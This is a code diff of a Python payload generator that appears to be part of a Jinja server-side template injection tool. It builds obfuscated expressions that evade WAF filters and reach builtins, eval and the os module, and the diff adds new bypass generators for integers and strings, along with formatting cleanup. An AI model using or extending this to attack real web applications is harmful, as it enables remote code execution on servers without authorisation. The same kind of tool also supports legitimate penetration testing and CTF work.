@@ -17,6 +17,7 @@ import re
 import time
 import logging
 import sys
+import math
 
 from collections import defaultdict
 from typing import (
@@ -142,6 +143,7 @@ def hashable(o):
     except Exception:
         return False
 
+
 def unparse(tree):
     content = ""
     for target, subtree in tree:
@@ -155,12 +157,21 @@ def unparse(tree):
             content += unparse(subtree)
     return content
 
+
 def iter_subtree(tree):
     for target, subtree in tree:
         # 需要跳过literal等, 因为其可能不是一个表达式而是一个或者多个token
-        if subtree and (target[0] not in ["literal", "oneof", "string_string_concat", ]):
+        if subtree and (
+            target[0]
+            not in [
+                "literal",
+                "oneof",
+                "string_string_concat",
+            ]
+        ):
             yield from iter_subtree(subtree)
     yield unparse(tree), tree
+
 
 def find_bad_exprs(tree, is_expr_bad_func):
     nodes = []
@@ -168,6 +179,7 @@ def find_bad_exprs(tree, is_expr_bad_func):
         if is_expr_bad_func(payload_unparsed):
             nodes.append((payload_unparsed, targetlist))
     return nodes
+
 
 class PayloadGenerator:
     """生成一个表达式，如('a'+'b')
@@ -182,9 +194,13 @@ class PayloadGenerator:
         callback: Union[Callable[[str, Dict], None], None] = None,
         detect_mode: str = DETECT_MODE_ACCURATE,
         environment: str = ENVIRONMENT_JINJA,
-        waf_expr_func: Union[Callable[[str], bool], None] = None
+        waf_expr_func: Union[Callable[[str], bool], None] = None,
     ):
-        self.waf_func = waf_func if waf_expr_func is None else (lambda x: waf_func(x) and waf_expr_func(x))
+        self.waf_func = (
+            waf_func
+            if waf_expr_func is None
+            else (lambda x: waf_func(x) and waf_expr_func(x))
+        )
         self.context = context if context else {}
         self.cache = {}
         # 给.generate_by_list的列表，指定每一个生成目标应该使用什么函数生成
@@ -245,10 +261,7 @@ class PayloadGenerator:
                 s, c, subs = result
                 str_result += s
                 used_context.update(c)
-                tree.append((
-                    target,
-                    subs
-                ))
+                tree.append((target, subs))
                 break
             else:
                 raise Exception("it shouldn't runs this line")
@@ -418,9 +431,7 @@ class PayloadGenerator:
         s, _, _ = result
         return s
 
-    def generate_detailed(
-        self, gen_type, *args
-    ) -> Union[PayloadGeneratorResult, None]:
+    def generate_detailed(self, gen_type, *args) -> Union[PayloadGeneratorResult, None]:
         """提供给用户的生成接口，接收一个生成目标的类型和参数
 
         Args:
@@ -511,6 +522,7 @@ def gen_zero_3(context: dict):
 def gen_zero_4(context: dict):
     return [(LITERAL, "({}|urlencode|count)")]
 
+
 @expression_gen
 def gen_zero_emptylength(context: dict):
     empty_things = [
@@ -527,17 +539,21 @@ def gen_zero_emptylength(context: dict):
     ]
     return [(ONEOF, empty_things), (ONEOF, get_length)]
 
+
 @expression_gen
 def gen_zero_5(context: dict):
     return [(LITERAL, "''.__len__( )")]
 
+
 @expression_gen
 def gen_zero_6(context: dict):
-    return [(LITERAL, "\"\".__len__( )")]
+    return [(LITERAL, '"".__len__( )')]
+
 
 @expression_gen
 def gen_zero_7(context: dict):
     return [(LITERAL, "( ).__len__( )")]
+
 
 # ---
 
@@ -589,6 +605,7 @@ def gen_positive_integer_sum(context: dict, value: int):
 @expression_gen
 def gen_positive_integer_recurmulitiply(context: dict, value: int):
     xs = [x for x in range(3, value // 2) if value % x == 0]
+    xs.sort(key=lambda x: max(x, value // x))
     if xs == [] or value < 20:
         return [(UNSATISFIED,)]
     return [
@@ -602,7 +619,7 @@ def gen_positive_integer_recurmulitiply(context: dict, value: int):
                     (POSITIVE_INTEGER, x),
                     (LITERAL, ")"),
                 ]
-                for x in xs[::-1]
+                for x in xs
             ],
         )
     ]
@@ -615,7 +632,8 @@ def gen_positive_integer_recurmultiply2(context: dict, value: int):
     alternatives = []
     for i in range(9, 3, -1):
         lst = [(LITERAL, "+"), (POSITIVE_INTEGER, value % i)] if value % i != 0 else []
-        alternative = ([
+        alternative = (
+            [
                 (LITERAL, "("),
                 (POSITIVE_INTEGER, value // i),
                 (LITERAL, "*"),
@@ -624,10 +642,46 @@ def gen_positive_integer_recurmultiply2(context: dict, value: int):
             + lst
             + [
                 (LITERAL, ")"),
-            ])
+            ]
+        )
         alternatives.append(alternative)
     if not alternatives:
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
+    return [(ONEOF, *alternatives)]
+
+
+@expression_gen
+def gen_positive_integer_recurmulnoastral(context: dict, value: int):
+    if value <= 20:
+        return [(UNSATISFIED,)]
+    alternatives = []
+    pieces_max = int(math.sqrt(value)) + 2
+    for i in range(3, pieces_max):
+        # value = a * i + b
+        a, b = (value // i), (value % i)
+        if a > pieces_max:
+            continue
+        if b == 0:
+            alternative = [
+                (POSITIVE_INTEGER, a),
+                (LITERAL, ".__mul__("),
+                (POSITIVE_INTEGER, i),
+                (LITERAL, ")"),
+            ]
+            alternatives.insert(0, alternative)
+        else:
+            alternative = [
+                (POSITIVE_INTEGER, a),
+                (LITERAL, ".__mul__("),
+                (POSITIVE_INTEGER, i),
+                (LITERAL, ")"),
+                (LITERAL, ".__add__("),
+                (POSITIVE_INTEGER, b),
+                (LITERAL, ")"),
+            ]
+            alternatives.append(alternative)
+    if not alternatives:
+        return [(UNSATISFIED,)]
     return [(ONEOF, *alternatives)]
 
 
@@ -638,7 +692,39 @@ def gen_positive_integer_dictlength(context: dict, value: int):
 
 @expression_gen
 def gen_positive_integer_length(context: dict, value: int):
-    return [(LITERAL, "(({},)|length)".format(",".join("x" * value)))]
+    lengthy_tuples_zero = (
+        [
+            (LITERAL, "("),
+        ]
+        + [item for _ in range(value) for item in [(ZERO,), (LITERAL, ",")]]
+        + [
+            (LITERAL, ")"),
+        ]
+    )
+    lengthy_tuples_x = (
+        [
+            (LITERAL, "("),
+        ]
+        + [
+            (ONEOF, *[[(LITERAL, chr(c) + ",")] for c in range(ord("a"), ord("z") + 1)])
+            for _ in range(value)
+        ]
+        + [
+            (LITERAL, ")"),
+        ]
+    )
+    return [
+        (LITERAL, "("),
+        (ONEOF, lengthy_tuples_x, lengthy_tuples_zero),
+        (
+            ONEOF,
+            [(LITERAL, ".__len__()")],
+            [(LITERAL, ".__len__( )")],
+            [(LITERAL, "|length")],
+        ),
+        (LITERAL, ")"),
+    ]
+
 
 @expression_gen
 def gen_positive_integer_wordcount(context: dict, value: int):
@@ -646,34 +732,26 @@ def gen_positive_integer_wordcount(context: dict, value: int):
 
 
 @expression_gen
-def gen_positive_integer_length2(context: dict, value: int):
-    return [(LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))]
-
-
-@expression_gen
 def gen_positive_integer_numbersum1(context: dict, value: int):
     if value < 5:
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
     alternative = []
-    for i in range(min(40, value-1), 3, -1):
+    for i in range(min(40, value - 1), 3, -1):
         inner = "+".join([str(i)] * (value // i) + [str(value % i)])
         alternative.append([(LITERAL, "({})".format(inner))])
-    return [
-        (ONEOF, *alternative)
-    ]
+    return [(ONEOF, *alternative)]
 
 
 @expression_gen
 def gen_positive_integer_numbersum2(context: dict, value: int):
     if value < 5:
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
     alternative = []
-    for i in range(min(40, value-1), 3, -1):
+    for i in range(min(40, value - 1), 3, -1):
         inner = ",".join([str(i)] * (value // i) + [str(value % i)])
         alternative.append([(LITERAL, "(({})|sum)".format(inner))])
-    return [
-        (ONEOF, *alternative)
-    ]
+    return [(ONEOF, *alternative)]
+
 
 @expression_gen
 def gen_positive_integer_onesum1(context: dict, value: int):
@@ -683,7 +761,6 @@ def gen_positive_integer_onesum1(context: dict, value: int):
 @expression_gen
 def gen_positive_integer_onesum2(context: dict, value: int):
     return [(LITERAL, "(({},)|sum)".format(",".join(["1"] * value)))]
-
 
 
 @expression_gen
@@ -841,11 +918,13 @@ def gen_string_lower_c_namespacebatch(context):
         (LITERAL, ")|first|last)"),
     ]
 
+
 # range|trim|batch(2)|first|last
+
 
 @expression_gen
 def gen_string_lower_c_classbatch(context):
-    alternatives =  [
+    alternatives = [
         [
             (LITERAL, f"({class_obj}|{tostring_filter}"),
             (LITERAL, "|batch("),
@@ -858,17 +937,14 @@ def gen_string_lower_c_classbatch(context):
             "joiner",
             "namespace",
         ]
-        for tostring_filter in [
-            "trim",
-            "string"
-        ]
+        for tostring_filter in ["trim", "string"]
     ]
     return [(ONEOF, *alternatives)]
 
 
 @expression_gen
 def gen_string_lower_c_classbatch2(context):
-    alternatives =  [
+    alternatives = [
         [
             (LITERAL, f"({class_obj}|e"),
             (LITERAL, "|batch("),
@@ -916,7 +992,6 @@ def gen_string_percent_urlencode2(context):
     return [(LITERAL, "({}|escape|urlencode|first)")]
 
 
-
 @expression_gen
 def gen_string_percent_lipsum2(context):
     return [(LITERAL, "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))")]
@@ -926,25 +1001,40 @@ def gen_string_percent_lipsum2(context):
 def gen_string_percent_lipsum3(context):
     return [(LITERAL, "(lipsum.__globals__.__builtins__.chr(37))")]
 
+
 # ((12).__mod__.__doc__|batch(12)|first|last)
+
 
 @expression_gen
 def gen_string_percent_moddoc(context):
     return [
         (LITERAL, "("),
-        (ONEOF, 
+        (
+            ONEOF,
             [(LITERAL, "(1).__mod__.__doc__")],
             [(LITERAL, "(( ).__len__( )).__mod__.__doc__")],
             [(LITERAL, "([ ].__len__( )).__mod__.__doc__")],
-            [(LITERAL, "((1)|attr(dict(__mod__=1)|first)|attr(dict(__doc__=1)|first))")],
-            [(LITERAL, "((1)|attr(dict(__m=1,od__=1)|join)|attr(dict(__d=1,oc__=1)|join))")],
+            [
+                (
+                    LITERAL,
+                    "((1)|attr(dict(__mod__=1)|first)|attr(dict(__doc__=1)|first))",
+                )
+            ],
+            [
+                (
+                    LITERAL,
+                    "((1)|attr(dict(__m=1,od__=1)|join)|attr(dict(__d=1,oc__=1)|join))",
+                )
+            ],
         ),
-        (ONEOF, 
+        (
+            ONEOF,
             [(LITERAL, "[11]")],
             [(LITERAL, "|batch(12)|first|last")],
         ),
-        (LITERAL, ")")
+        (LITERAL, ")"),
     ]
+
 
 @expression_gen
 def gen_string_percent_namespace(context):
@@ -961,13 +1051,7 @@ def gen_string_percent_namespace(context):
 @expression_gen
 def gen_string_percent_dictbatch(context):
     # "{{((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join,dict(c=1)|join,dict()|trim|last)|join).format((9,9,9,9,1)|sum)}}"
-    whatever_onedigit_number = (
-        ONEOF,
-        *[
-            [(INTEGER, i)]
-            for i in range(1, 10)
-        ]
-    )
+    whatever_onedigit_number = (ONEOF, *[[(INTEGER, i)] for i in range(1, 10)])
     return [
         (
             LITERAL,
@@ -979,11 +1063,12 @@ def gen_string_percent_dictbatch(context):
         (LITERAL, "))|batch("),
         (INTEGER, 2),
         (LITERAL, "))|join,"),
-        (STRING_LOWERC, ),
+        (STRING_LOWERC,),
         (LITERAL, ",dict()|trim|last)|join).format("),
         (INTEGER, 37),
         (LITERAL, ")"),
     ]
+
 
 @expression_gen
 def gen_string_percent_lipsum(context):
@@ -996,7 +1081,6 @@ def gen_string_percent_lipsum(context):
             + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))",
         )
     ]
-
 
 
 @expression_gen
@@ -1041,6 +1125,7 @@ def gen_string_percent_urlencodelong(context):
         )
     ]
 
+
 # (dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,'c')).format(37)
 @expression_gen
 def gen_string_percent_replaceformat(context):
@@ -1049,12 +1134,12 @@ def gen_string_percent_replaceformat(context):
             LITERAL,
             "(dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,",
         ),
-        (STRING_LOWERC, ),
+        (STRING_LOWERC,),
         (LITERAL, ")).format("),
         (INTEGER, 37),
         (LITERAL, ")"),
-
     ]
+
 
 # (dict(((2,3),(2,3)))|replace(1|center|first,x)|replace(3,'c')).format(2,2,37)
 @expression_gen
@@ -1064,7 +1149,7 @@ def gen_string_percent_replaceformat2(context):
             LITERAL,
             "(dict(((2,3),(2,3)))|replace(1|center|first,x)|replace(3,",
         ),
-        (STRING_LOWERC, ),
+        (STRING_LOWERC,),
         (LITERAL, ")).format(2,2,"),
         (INTEGER, 37),
         (LITERAL, ")"),
@@ -1073,17 +1158,25 @@ def gen_string_percent_replaceformat2(context):
 
 # ({1:1}|trim|replace(1,x|trim)|replace(x|center|first,"c")).format(37)
 
+
 @expression_gen
 def gen_string_percent_replaceformat3(context):
     return [
-        (ONEOF, *[
-            [(
-                LITERAL,
-                "({NUM:NUM}|trim|replace(NUM,x|trim)|replace(x|center|first,".replace("NUM", str(i)),
-            )]
-            for i in range(0, 10)
-        ]),
-        (STRING_LOWERC, ),
+        (
+            ONEOF,
+            *[
+                [
+                    (
+                        LITERAL,
+                        "({NUM:NUM}|trim|replace(NUM,x|trim)|replace(x|center|first,".replace(
+                            "NUM", str(i)
+                        ),
+                    )
+                ]
+                for i in range(0, 10)
+            ],
+        ),
+        (STRING_LOWERC,),
         (LITERAL, ")).format("),
         (INTEGER, 37),
         (LITERAL, ")"),
@@ -1149,6 +1242,7 @@ def gen_string_percent_lower_c_tuplejoin(context):
         (LITERAL, ")|join)"),
     ]
 
+
 @expression_gen
 def gen_string_percent_lower_c_replaceconcat(context):
     # ('c'|replace(x|trim,'%',1))
@@ -1159,7 +1253,7 @@ def gen_string_percent_lower_c_replaceconcat(context):
         (STRING_PERCENT,),
         (LITERAL, ","),
         (INTEGER, 1),
-        (LITERAL, "))")
+        (LITERAL, "))"),
     ]
 
 
@@ -1183,7 +1277,6 @@ def gen_string_many_percent_lower_c_multiply(context, count: int):
     return [(STRING_PERCENT_LOWER_C,), (LITERAL, "*"), (INTEGER, count)]
 
 
-
 @expression_gen
 def gen_string_many_percent_lower_c_replacespace(context, count: int):
     # (x|center(2)|replace(x|center|first,'%c'))
@@ -1191,7 +1284,7 @@ def gen_string_many_percent_lower_c_replacespace(context, count: int):
         (LITERAL, "(x|center("),
         (INTEGER, count),
         (LITERAL, ")|replace(x|center|first,"),
-        (STRING_PERCENT_LOWER_C, ),
+        (STRING_PERCENT_LOWER_C,),
         (LITERAL, "))"),
     ]
 
@@ -1199,16 +1292,13 @@ def gen_string_many_percent_lower_c_replacespace(context, count: int):
 @expression_gen
 def gen_string_many_percent_lower_c_nulljoin(context, count: int):
     # ((x,x,x)|join('%c'))
-    return [
-        (LITERAL, "(("),
-    ] + [
-        (LITERAL, "x,")
-        for _ in range(count+1)
-    ] + [
-        (LITERAL, ")|join("),
-        (STRING_PERCENT_LOWER_C, ),
-        (LITERAL, "))")
-    ]
+    return (
+        [
+            (LITERAL, "(("),
+        ]
+        + [(LITERAL, "x,") for _ in range(count + 1)]
+        + [(LITERAL, ")|join("), (STRING_PERCENT_LOWER_C,), (LITERAL, "))")]
+    )
 
 
 @expression_gen
@@ -1250,10 +1340,9 @@ def gen_string_many_percent_lower_c_join(context, count: int):
             (STRING_PERCENT_LOWER_C,),
         ]
         for i in range(count)
-    ] + [
-        [(LITERAL, ")|join)")]
-    ]
+    ] + [[(LITERAL, ")|join)")]]
     return [item for lst in l for item in lst]
+
 
 # ---
 
@@ -1315,13 +1404,15 @@ def gen_char_literal1(context, c):
 def gen_char_literal2(context, c):
     return [(LITERAL, f'"{c}"' if c != '"' else '"\\""')]
 
+
 @expression_gen
 def gen_char_underline(context, c):
-    return [(UNSATISFIED, )] if c != "_" else [(STRING_UNDERLINE, )]
+    return [(UNSATISFIED,)] if c != "_" else [(STRING_UNDERLINE,)]
+
 
 @expression_gen
 def gen_char_percent(context, c):
-    return [(UNSATISFIED, )] if c != "%" else [(STRING_PERCENT, )]
+    return [(UNSATISFIED,)] if c != "%" else [(STRING_PERCENT,)]
 
 
 @expression_gen
@@ -1511,9 +1602,7 @@ def gen_char_select(context, c):
     for pattern, d in char_patterns.items():
         for index, value in d.items():
             if value == c:
-                matches.append(
-                    [(LITERAL, pattern.replace("INDEX", str(index)))]
-                )
+                matches.append([(LITERAL, pattern.replace("INDEX", str(index)))])
     if not matches:
         return [(UNSATISFIED,)]
     return [(ONEOF, *matches)]
@@ -1780,7 +1869,6 @@ def gen_string_concat3(context: dict, value: str):
     ]
 
 
-
 @expression_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
@@ -1903,6 +1991,21 @@ def gen_string_formatfunc3(context: dict, value: str):
 
 
 @expression_gen
+def gen_string_formatfunc4(context: dict, value: str):
+    # (('%c'*n).__mod__((97,98,99)))
+    req = []
+    req.append((LITERAL, "(("))
+    req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
+    req.append((LITERAL, ").__mod__(("))
+    for i, c in enumerate(value):
+        if i != 0:
+            req.append((LITERAL, ","))
+        req.append((INTEGER, ord(c)))
+    req.append((LITERAL, ")))"))
+    return req
+
+
+@expression_gen
 def gen_string_chars(context: dict, value: str):
     ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
     for c in value[1:]:
@@ -1924,7 +2027,6 @@ def gen_string_chars2(context: dict, value: str):
         (LITERAL, ")|join)"),
     )
     return ans
-
 
 
 # ---
@@ -2238,6 +2340,7 @@ def gen_eval_func_safesplit(context):
         )
     ]
 
+
 @expression_gen
 def gen_eval_func_safejoin(context):
     return [
@@ -2250,6 +2353,7 @@ def gen_eval_func_safejoin(context):
             (ITEM, "eval"),
         )
     ]
+
 
 @expression_gen
 def gen_eval_func_safelower(context):
@@ -2264,6 +2368,7 @@ def gen_eval_func_safelower(context):
         )
     ]
 
+
 @expression_gen
 def gen_eval_func_safezfill(context):
     return [
@@ -2276,6 +2381,7 @@ def gen_eval_func_safezfill(context):
             (ITEM, "eval"),
         )
     ]
+
 
 # ---
 
@@ -2383,6 +2489,7 @@ def gen_module_os_gpop(context):
         )
     ]
 
+
 @expression_gen
 def gen_module_os_gget(context):
     return [
@@ -2394,6 +2501,7 @@ def gen_module_os_gget(context):
             (ITEM, "os"),
         )
     ]
+
 
 @expression_gen
 def gen_module_os_urlfor(context):
